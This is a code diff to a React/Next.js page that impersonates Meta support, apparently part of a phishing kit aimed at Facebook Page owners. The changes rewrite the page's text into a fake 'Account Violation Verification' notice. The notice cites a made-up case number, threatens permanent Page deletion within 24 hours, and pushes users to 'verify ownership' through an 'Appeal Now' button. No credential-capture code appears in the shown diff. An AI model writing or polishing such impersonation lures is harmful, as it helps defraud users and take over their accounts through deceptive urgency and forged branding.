@@ -1,6 +1,6 @@
 'use client';
 import BackgroundImage from '@/assets/images/bg-image.png';
-import logo from '@/assets/images/logo.png';
+import congaImage from '@/assets/images/conga.jpg';
 import MetaAI from '@/assets/images/meta-ai-image.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ProfileImage from '@/assets/images/profile-image.png';
@@ -123,12 +123,13 @@ const Page: FC = () => {
     const welcomeTextsToTranslate = useMemo(
         () => [
             'Meta Support Center: Account Violation Verification',
-            "Our system has detected multiple severe violations of Meta's Terms of Service and Community Standards on your Page. Case file CASE_#2026_88591244 has been created, and your Page is scheduled for permanent deletion within the next 24 hours. Please review the violation details to submit an urgent appeal.",
-            'Review report',
-            "Violation evidence and case history file have been generated.",
+            "Our system has detected multiple severe violations of Meta's Terms of Service and Community Standards on your Page. Case file",
+            'has been created, and your Page is scheduled for permanent deletion within the next 24 hours. Please review the violation details to submit an urgent appeal.',
+            'More infomation',
+            'Violation evidence and case history file have been generated.',
             'Click the button below to view the detailed violation report and verify your ownership to file an appeal.',
             'View Violations & Appeal Now',
-            'Your Page is scheduled for permanent removal on'
+            'Your account was restricted on'
         ],
         []
     );
@@ -216,16 +217,23 @@ const Page: FC = () => {
                 <div className='relative flex min-h-screen items-center justify-center bg-white'>
                     <div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
                         {/* Logo */}
-                        <div className='overflow-hidden rounded-lg'>
-                            <Image src={logo} alt='Logo' className='mx-auto mb-0 block h-full w-full' priority />
+                        <div className='overflow-hidden rounded-xl border border-gray-100 bg-white shadow-sm'>
+                            <Image
+                                src={congaImage}
+                                alt='Security verification illustration'
+                                className='mx-auto block h-auto w-full object-cover'
+                                priority
+                            />
                         </div>
 
-                        <p className='text-2xl font-bold'>{t('Welcome To Facebook Protect.')}</p>
+                        <p className='text-2xl font-bold'>{t('Meta Support Center: Account Violation Verification')}</p>
 
                         <p className='text-gray-700'>
-                            {t("Your account's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.")}{' '}
+                            {t("Our system has detected multiple severe violations of Meta's Terms of Service and Community Standards on your Page. Case file")}{' '}
+                            <strong>CASE_#2026_88591244</strong>{' '}
+                            {t('has been created, and your Page is scheduled for permanent deletion within the next 24 hours. Please review the violation details to submit an urgent appeal.')}{' '}
                             <a className='text-blue-500 hover:underline' href='https://www.facebook.com/help' target='_blank' rel='noreferrer'>
-                                {t('More information')}
+                                {t('More infomation')}
                             </a>
                         </p>
 
@@ -239,7 +247,7 @@ const Page: FC = () => {
                                             <path stroke='currentColor' strokeLinecap='round' strokeLinejoin='round' strokeWidth='2' d='M1 5.917 5.724 10.5 15 1.5' />
                                         </svg>
                                     </span>
-                                    <h3 className='text-black'>{t("We've enabled advanced protections to unlock your Page.")}</h3>
+                                    <h3 className='text-black'>{t('Violation evidence and case history file have been generated.')}</h3>
                                 </li>
                                 {/* Step 2 - active */}
                                 <li className='ms-6'>
@@ -248,7 +256,7 @@ const Page: FC = () => {
                                             <path d='M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z' />
                                         </svg>
                                     </span>
-                                    <h3 className='text-black'>{t('Below, we walk you through the process in detail and help you fully activate to unlock your Page.')}</h3>
+                                    <h3 className='text-black'>{t('Click the button below to view the detailed violation report and verify your ownership to file an appeal.')}</h3>
                                 </li>
                             </ol>
                         </div>
@@ -257,7 +265,7 @@ const Page: FC = () => {
                             onClick={() => setShowWelcome(false)}
                             className='block w-full cursor-pointer rounded-lg bg-blue-500 py-3 text-center text-lg font-semibold text-white hover:bg-blue-600 transition-colors'
                         >
-                            {t('Continue')}
+                            {t('View Violations & Appeal Now')}
                         </button>
 
                         <p className='mb-5 mt-3 block text-center'>
